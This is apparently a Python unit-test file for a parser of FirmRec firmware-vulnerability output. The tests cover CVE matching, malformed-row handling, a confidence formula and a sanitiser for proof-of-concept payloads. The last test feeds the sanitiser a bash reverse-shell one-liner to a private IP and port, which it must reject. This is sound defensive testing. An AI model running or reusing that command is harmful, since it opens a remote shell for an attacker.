"""FirmRec parser unit tests (F-FirmRec.md §8: six branches, >=80% coverage).

These tests parse *fixtures only* -- they never invoke the real FirmRec image or
Docker (CI discipline from docs/external/README.md §3.3). Each fixture models one
of the six parser branches plus the confidence formula.
"""

from __future__ import annotations

from pathlib import Path

from tools.external.firmrec.parser import (
    compute_confidence,
    parse_firmrec_output,
)
from tools.external.firmrec.sanitize import sanitize_poc

FIXTURES = (
    Path(__file__).resolve().parent.parent.parent
    / "tools"
    / "external"
    / "firmrec"
    / "fixtures"
)
# Abstract rootfs: FirmRec's binary ids are not real paths on this host.
ROOTFS = Path("/tmp/fake_rootfs")


def _parse(name: str):
    return parse_firmrec_output(FIXTURES / name, rootfs=ROOTFS, run_id="test", tool_version="v1")


def test_vulns_md_normal_yields_findings_with_cve():
    findings, stats = _parse("vulns_normal")
    assert len(findings) >= 1
    assert any(f["matched_cve"] == "CVE-2017-17215" for f in findings)
    assert findings[0]["tool"] == "firmrec"
    assert findings[0]["status"] == "ok"
    # Recurrence findings always carry matched_cve (the isolation signal).
    assert all(f.get("matched_cve") for f in findings)


def test_vulns_md_empty_returns_empty_ok():
    findings, stats = _parse("vulns_empty")
    assert findings == []
    assert stats.files_seen  # parser still recorded what it looked at


def test_pg_dump_normal_parses_binary_addr_similarity():
    findings, stats = _parse("pg_normal")
    assert len(findings) == 2
    by_cve = {f["matched_cve"]: f for f in findings}
    assert by_cve["CVE-2017-17215"]["sink"]["addr"] == "0x40a1b0"
    # Similarity 0.92 is used directly as confidence.
    assert by_cve["CVE-2017-17215"]["confidence"] == 0.92
    assert by_cve["CVE-2021-31802"]["vuln_class"] == "overflow"


def test_pg_dump_malformed_skips_bad_row_and_notes():
    findings, stats = _parse("pg_malformed")
    # The valid row is kept; the NOTANHEX row is dropped.
    assert len(findings) == 1
    assert stats.unparsed_lines >= 1


def test_poc_info_dangerous_payload_rejected_and_dropped():
    findings, stats = _parse("poc_dangerous")
    # An unsafe PoC must never be persisted.
    assert findings == []
    assert stats.dropped_unsafe >= 1


def test_no_result_version_difference_returns_empty_ok():
    findings, stats = _parse("no_result")
    assert findings == []
    assert all(f.get("status") == "ok" for f in findings)


def test_compute_confidence_direct_and_formula():
    assert compute_confidence(0.92) == 0.92
    assert compute_confidence(1.5) == 1.0  # capped
    assert compute_confidence(None, has_entry=True) == 0.7  # 0.5 + 0.2
    assert compute_confidence(None, has_entry=False) == 0.5


def test_sanitize_poc_rejects_reverse_shell_accepts_benign():
    _, ok_bad = sanitize_poc("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
    assert ok_bad is False
    _, ok_good = sanitize_poc("GET /goform/set.cgi HTTP/1.1")
    assert ok_good is True
    _, ok_empty = sanitize_poc("")
    assert ok_empty is True
